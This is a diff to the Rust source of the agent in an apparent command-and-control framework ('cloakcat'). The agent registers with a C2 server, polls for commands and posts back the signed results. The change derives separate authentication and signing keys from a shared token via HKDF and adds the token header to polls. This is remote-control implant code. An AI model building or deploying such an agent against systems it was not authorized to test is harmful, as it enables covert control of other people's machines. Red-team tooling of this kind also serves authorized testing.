@@ -11,7 +11,7 @@ use std::env;
 use std::time::Duration;
 
 use anyhow::Context;
-use cloakcat_protocol::{sign_result, Command, Endpoints, ResultReq};
+use cloakcat_protocol::{sign_result, Command, DerivedKeys, Endpoints, ResultReq};
 use rand::Rng;
 use reqwest::Client;
 use tokio::time::sleep;
@@ -40,13 +40,14 @@ async fn send_result(
     client: &Client,
     result_url: &str,
     agent_id: &str,
-    token_raw: &[u8],
+    signing_key: &[u8],
+    auth_token: &str,
     cmd_id: &str,
     exit_code: i32,
     stdout: &str,
     stderr: &str,
 ) -> anyhow::Result<()> {
-    let signature = sign_result(agent_id, cmd_id, stdout, token_raw);
+    let signature = sign_result(agent_id, cmd_id, stdout, signing_key);
     let body = ResultReq {
         cmd_id: cmd_id.to_string(),
         exit_code,
@@ -55,7 +56,7 @@ async fn send_result(
         signature,
     };
 
-    let res = client.post(result_url).json(&body).send().await?;
+    let res = client.post(result_url).header("X-Agent-Token", auth_token).json(&body).send().await?;
     if !res.status().is_success() {
         let status = res.status();
         let text = res.text().await.unwrap_or_default();
@@ -129,18 +130,20 @@ pub async fn run() -> anyhow::Result<()> {
 
     let endpoints = Endpoints::new(&cfg.c2_url, &cfg.profile_name, &agent_id);
 
-    // SECURITY: X-Agent-Token is sent in plaintext over HTTP.
+    // Derive auth + signing keys from the shared master token via HKDF.
+    let keys = DerivedKeys::from_master(cfg.shared_token.as_bytes());
+    let auth_token = keys.auth_token();
+
+    // SECURITY: auth_token is sent in plaintext over HTTP.
     // Set c2_url to https:// and configure TLS on the server for production use.
     let resp = client
         .post(&endpoints.register)
-        .header("X-Agent-Token", &cfg.shared_token)
+        .header("X-Agent-Token", &auth_token)
         .json(&reg)
         .send()
         .await?;
     let reg_json: cloakcat_protocol::RegisterResp = resp.json().await?;
     debug_log!("Registered: {:?}", reg_json);
-
-    let token_raw = cfg.shared_token.as_bytes().to_vec();
 
     let beacon_min = env::var("AGENT_BEACON_MIN_MS")
         .ok()
@@ -159,7 +162,7 @@ pub async fn run() -> anyhow::Result<()> {
     loop {
         let url = format!("{}?hold=45", endpoints.poll);
 
-        let res = match client.get(&url).send().await {
+        let res = match client.get(&url).header("X-Agent-Token", &auth_token).send().await {
             Ok(r) => r,
             Err(e) => {
                 debug_log!("[agent] poll send error: {e} -> backoff");
@@ -223,7 +226,8 @@ pub async fn run() -> anyhow::Result<()> {
                     &client,
                     &endpoints.result,
                     &agent_id,
-                    &token_raw,
+                    &keys.signing_key,
+                    &auth_token,
                     &cmd.cmd_id,
                     exit_code,
                     &stdout,
@@ -250,7 +254,8 @@ pub async fn run() -> anyhow::Result<()> {
             &client,
             &endpoints.result,
             &agent_id,
-            &token_raw,
+            &keys.signing_key,
+            &auth_token,
             &cmd.cmd_id,
             exit_code,
             &stdout,
